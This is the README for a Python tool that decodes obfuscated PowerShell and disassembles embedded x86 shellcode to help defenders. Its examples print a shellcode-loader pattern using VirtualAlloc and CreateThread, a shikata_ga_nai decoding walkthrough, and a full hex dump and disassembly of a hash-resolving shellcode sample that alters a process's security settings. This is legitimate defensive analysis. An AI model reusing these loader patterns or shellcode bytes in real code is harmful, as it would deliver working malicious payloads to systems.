# PyPowerShellXray
Python script to decode common encoded PowerShell scripts.

Hope you find it helpful!

Even more hacked together by @JohnLaTwC, Nov 2016
v 0.6
With apologies to @Lee_Holmes for using Python instead of PowerShell. In decoding so much PowerShell, I didn't want to risk a self-infection :)

This script attempts to decode encoded powershell commands.  
  REQUIREMENTS: This script uses vivisect for PE parsing and dissasembly: https://github.com/vivisect/vivisect. Set the PYTHONPATH as appropriate.
e.g. set pythonpath=C:\vivisect-master\vivisect-master

Things this script tries to do.  Emphasis on tries.
* It attempts to decode recusively if instructed (via the -r switch)
* It attempts to find Base64 data, compressed content (Gzip, Deflate), or char[]](77,105,95) style encoding
* It attempts to 'find/replace' the encoded text in the powershell command. This is handy
     if the script has numerous chunks of encoded content
* If it finds shellcode, it attempts to display it. LIMITATION: x86 shellcode only
     If you ever come across this sequence in PowerShell, you know you have shellcode

```
         [Byte[]]$z = 0xb8,0x46,0x0f,0x64...REST OF SHELLCODE;
         ...
         $Nb7=$w::VirtualAlloc(0,0x1000,$g,0x40);
         ...
         $w::CreateThread(0,0,$Nb7,0,0,0);
```
With the shellcode it tries:
     - Resolve APIs. The APIs used by shellcode gives defenders a clue as to what to look for on host.
         e.g. if you calls to winsock/wininet/winhttp APIs, you know they connected to a URL or IP
         e.g. if you see a call to WinExec / CreateProcess, you know something was downloaded and spawned

```
         push 0x0726774c         << 0x0726774c is the hash of the API text "kernel32.dll!LoadLibraryA"
         call ebp --> kernel32.dll!LoadLibraryA
```

Pretty sure @stephenfewer came up with blockhash in https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm
         Rather than have a hardcoded list of API hashes, it build a dictionary based on your local binaries. 
         This means the script requires Windows as the underlying OS to do this.
- Display ascii text for DWORD constants to assist decoding. 
         e.g. the below shows the encoding of ws2_32 [.dll] before a call to LoadLibrary

```
         push 0x00003233--> '23'
         push 0x5f327377--> '_2sw'
         push esp
         push 0x0726774c--> '&wL' << garbage. this is just the API hash for 'kernel32.dll!LoadLibraryA'
         call ebp --> kernel32.dll!LoadLibraryA
```
- Display IP:port for calls to socket/Internet APIs

```
         push 0x68bff1c0
         push 0xbb010002--> IP 192.241.191.104:443
```
- Display a hex dump to look for strings
- Decode some encoded shellcode. Shellcode is often encoded.  A common one is shikata_ga_nai.
         You can disable this behavior by the -nx switch
         Here is an example of the shikata encoder in action:

```
         0x00000000 b8460f64cf       mov eax,0xcf640f46          << 4byte XOR key
         0x00000005 dbcf             fcmovne st0,st7             << execute any floating point operation to set up GetPC
         0x00000007 d97424f4         fnstenv  [esp - 12]         << stores floating point state
         0x0000000b 5d               pop ebp                     << GetPC: pop addr of last FP instr into ebp
         0x0000000c 29c9             sub ecx,ecx
         0x0000000e b147             mov cl,71                   << 71 DWORD to decode
         0x00000010 314513           xor dword [ebp + 19],eax    << start of XOR decode loop
         0x00000013 83edfc           sub ebp,0xfffffffc          << increment counter by 4 
         0x00000016 034549           add eax,dword [ebp + 73]    << partial garbage instruction
         0x00000019 ed               in eax,dx                   << garbage b/c it's encoded
         0x0000001a 91               ... garbarge bytes continue
```

  Post decode you get something like:

```
         0x00000010 314513           xor dword [ebp + 19],eax
         0x00000013 83edfc           sub ebp,0xfffffffc
         0x00000016 03450f           add eax,dword [ebp + 15] << pre decode this was: add eax,dword [ebp + 73] 
         0x00000019 e2f5             loop 0x00000010             << the expected loop operation. 71 times
         0x0000001b fc               cld                         ... decoded content. it's now valid shellcode
         0x0000001c e882000000       call 0x000000a3
         0x00000021 60               pushad 
         0x00000022 89e5             mov ebp,esp
         0x00000024 31c0             xor eax,eax
         0x00000026 648b5030         fs: mov edx,dword [eax + 48]
         0x0000002a 8b520c           mov edx,dword [edx + 12]
         0x0000002d 8b5214           mov edx,dword [edx + 20]
         0x00000030 8b7228           mov esi,dword [edx + 40]
         0x00000033 0fb74a26         movzx ecx,word [edx + 38]
         ...
```
A real programmer would use an emulator (libemu).  Not this script

"I'm running this on Linux or Mac and don't have the Windows DLLs around to get the hashes for API resolution. Help!" I added a database (sqlite) of common APIs & hashes.  Give it a whirl like so:

```
python.exe psx.py  -f test1.txt -db apihashes.db
Hex dump: 60 9c 54 5e fc e8 82 00 00 00 60 89 e5 31 c0 64 8b 50 30 8b 52 0c 8b 52 14 8b 72 28 0f b7 4a 26 31 ff ac 3c 61 7c 02 2c 20 c1 cf 0d 01 c7 e2 f2 52 57 8b 52 10 8b 4a 3c 8b 4c 11 78 e3 48 01 d1 51 8b 59 20 01 d3 8b 49 18 e3 3a 49 8b 34 8b 01 d6 31 ff ac c1 cf 0d 01 c7 38 e0 75 f6 03 7d f8 3b 7d 24 75 e4 58 8b 58 24 01 d3 66 8b 0c 4b 8b 58 1c 01 d3 8b 04 8b 01 d0 89 44 24 24 5b 5b 61 59 5a 51 ff e0 5f 5f 5a 8b 12 eb 8d 5d 68 49 47 c6 62 ff d5 50 6a 00 68 ff 0f 1f 00 68 ee 95 b6 50 ff d5 89 c3 6a 00 68 70 69 33 32 68 61 64 76 61 54 68 4c 77 26 07 ff d5 68 44 3a 50 00 83 ec 04 6a 00 8d 44 24 04 50 6a 01 8d 44 24 10 50 68 9a 63 6f da ff d5 6a 04 53 68 db f8 3a d6 ff d5 89 f4 61 9d c3
0x00000000 60               pushad
0x00000001 9c               pushfd
0x00000002 54               push esp
0x00000003 5e               pop esi
0x00000004 fc               cld
0x00000005 e882000000       call 0x0000008c
0x0000000a 60               pushad
0x0000000b 89e5             mov ebp,esp
0x0000000d 31c0             xor eax,eax
0x0000000f 648b5030         fs: mov edx,dword [eax + 48]
0x00000013 8b520c           mov edx,dword [edx + 12]
0x00000016 8b5214           mov edx,dword [edx + 20]
0x00000019 8b7228           mov esi,dword [edx + 40]
0x0000001c 0fb74a26         movzx ecx,word [edx + 38]
0x00000020 31ff             xor edi,edi
0x00000022 ac               lodsb
0x00000023 3c61             cmp al,97
0x00000025 7c02             jl 0x00000029
0x00000027 2c20             sub al,32
0x00000029 c1cf0d           ror edi,13
0x0000002c 01c7             add edi,eax
0x0000002e e2f2             loop 0x00000022
0x00000030 52               push edx
0x00000031 57               push edi
0x00000032 8b5210           mov edx,dword [edx + 16]
0x00000035 8b4a3c           mov ecx,dword [edx + 60]
0x00000038 8b4c1178         mov ecx,dword [ecx + edx + 120]
0x0000003c e348             jecxz 0x00000086
0x0000003e 01d1             add ecx,edx
0x00000040 51               push ecx
0x00000041 8b5920           mov ebx,dword [ecx + 32]
0x00000044 01d3             add ebx,edx
0x00000046 8b4918           mov ecx,dword [ecx + 24]
0x00000049 e33a             jecxz 0x00000085
0x0000004b 49               dec ecx
0x0000004c 8b348b           mov esi,dword [ebx + ecx * 4]
0x0000004f 01d6             add esi,edx
0x00000051 31ff             xor edi,edi
0x00000053 ac               lodsb
0x00000054 c1cf0d           ror edi,13
0x00000057 01c7             add edi,eax
0x00000059 38e0             cmp al,ah
0x0000005b 75f6             jnz 0x00000053
0x0000005d 037df8           add edi,dword [ebp - 8]
0x00000060 3b7d24           cmp edi,dword [ebp + 36]
0x00000063 75e4             jnz 0x00000049
0x00000065 58               pop eax
0x00000066 8b5824           mov ebx,dword [eax + 36]
0x00000069 01d3             add ebx,edx
0x0000006b 668b0c4b         mov cx,word [ebx + ecx * 2]
0x0000006f 8b581c           mov ebx,dword [eax + 28]
0x00000072 01d3             add ebx,edx
0x00000074 8b048b           mov eax,dword [ebx + ecx * 4]
0x00000077 01d0             add eax,edx
0x00000079 89442424         mov dword [esp + 36],eax
0x0000007d 5b               pop ebx
0x0000007e 5b               pop ebx
0x0000007f 61               popad
0x00000080 59               pop ecx
0x00000081 5a               pop edx
0x00000082 51               push ecx
0x00000083 ffe0             jmp eax
0x00000085 5f               pop edi
0x00000086 5f               pop edi
0x00000087 5a               pop edx
0x00000088 8b12             mov edx,dword [edx]
0x0000008a eb8d             jmp 0x00000019
0x0000008c 5d               pop ebp
0x0000008d 684947c662       push 0x62c64749--> 'bGI'
0x00000092 ffd5             call ebp --> kernel32.dll!GetCurrentProcessId
0x00000094 50               push eax
0x00000095 6a00             push 0
0x00000097 68ff0f1f00       push 0x001f0fff
0x0000009c 68ee95b650       push 0x50b695ee
0x000000a1 ffd5             call ebp --> kernel32.dll!OpenProcess
0x000000a3 89c3             mov ebx,eax
0x000000a5 6a00             push 0
0x000000a7 6870693332       push 0x32336970--> '23ip'
0x000000ac 6861647661       push 0x61766461--> 'avda'
0x000000b1 54               push esp
0x000000b2 684c772607       push 0x0726774c--> '&wL'
0x000000b7 ffd5             call ebp --> kernel32.dll!LoadLibraryA
0x000000b9 68443a5000       push 0x00503a44--> 'P:D'
0x000000be 83ec04           sub esp,4
0x000000c1 6a00             push 0
0x000000c3 8d442404         lea eax,dword [esp + 4]
0x000000c7 50               push eax
0x000000c8 6a01             push 1
0x000000ca 8d442410         lea eax,dword [esp + 16]
0x000000ce 50               push eax
0x000000cf 689a636fda       push 0xda6f639a--> 'oc'
0x000000d4 ffd5             call ebp --> advapi32.dll!ConvertStringSecurityDescriptorToSecurityDescriptorA
0x000000d6 6a04             push 4
0x000000d8 53               push ebx
0x000000d9 68dbf83ad6       push 0xd63af8db
0x000000de ffd5             call ebp --> advapi32.dll!SetKernelObjectSecurity
0x000000e0 89f4             mov esp,esi
0x000000e2 61               popad
0x000000e3 9d               popfd
0x000000e4 c3               ret

Byte Dump:
`.T^......`..1.d.P0.R.R..r(..J&1..<a|.,......RW.R..J<.L.x.H..Q.Y...I..:I.4...1......8.u..}.;}$u.X.X$..f.K.X.........D$$[[aYZQ..__Z....]hIG.b..Pj.h....h...P....j.hpi32hadvaThLw&...hD:P....j..D$.Pj..D$.Ph.co...j.Sh..:.....a..
```


